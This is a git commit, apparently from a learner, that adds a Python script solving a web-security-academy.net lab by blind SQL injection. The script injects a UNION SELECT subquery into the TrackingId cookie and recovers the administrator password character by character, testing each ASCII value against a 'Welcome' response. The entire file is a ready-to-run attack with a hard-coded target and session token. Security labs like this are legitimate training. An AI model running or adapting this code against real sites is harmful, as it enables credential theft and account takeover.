91df4ce328604186fe8492735700ff189e7b8a60
Andrés Hernández Mata <andreshernandezmta@gmail.com>
2021-10-01 19:46:21 -0500

    Funcion blind_sql_injection

--- src/blind_sql_injection.py
+++ src/blind_sql_injection.py
@@ -6,4 +6,24 @@ Python: 3.9.1
 Fecha: 30 Septiembre 2021
 """
 
+import requests
+
+def blind_sql_injection(url, length):
+    output = ""    
+    headers = {}
+    for i in range(1, length+1):
+        base_cookie = """TrackingId = a 'UNION SELECT 'a' from users WHERE username = 'administrator' and 
+        (ascii(substring(password, %s, 1))) = [CHAR]--; session = P8S07UmOj9Qf5xpVVMvciUcBG6sCkvwp""" % str(i)
+        for j in range(32,126):
+            print("Currently trying digit %s with: " % str(i), chr(j))
+            cookie = base_cookie.replace("[CHAR]", str(j))
+            headers["cookie"] = cookie
+            res = requests.get(url, headers = headers)
+            if "Welcome" in res.content.decode("utf-8"):
+                output += chr(j)
+                break
+        print("Current password: ", output)
+
+url = "https://ac2c1feb1e7e3f7781a016ff008a0075.web-security-academy.net/"
+blind_sql_injection(url, 20)
 
